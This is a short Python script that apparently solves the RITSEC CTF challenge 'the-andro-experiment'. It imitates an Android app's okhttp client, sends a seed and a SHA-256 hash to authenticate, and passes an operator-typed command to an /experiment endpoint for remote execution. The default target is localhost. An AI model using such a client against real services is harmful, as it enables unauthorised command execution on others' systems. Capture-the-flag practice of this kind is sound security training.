#!/usr/bin/env python3

import requests
import hashlib

def main():
    headers = {'User-Agent': 'okhttp'}
    seed = b'SEED:\x01\x01\x02\x03'

    URL0 = 'http://127.0.0.1:5000/ping'
    # URL0 = 'https://the-andro-experiment.ctf.ritsec.club/ping'
    response = requests.post(url=URL0, data=seed, headers=headers)

    command = input("Enter command: ")

    URL1='http://127.0.0.1:5000/experiment?command=' + command
    # URL1='http://the-andro-experiment.ctf.ritsec.club/experiment?command=' + command
    payload = hashlib.sha256(b'\x01\x01\x02\x03').digest()

    response = requests.post(url=URL1, data=payload, headers=headers)
    print(response.text)

if __name__ == "__main__":
    main()

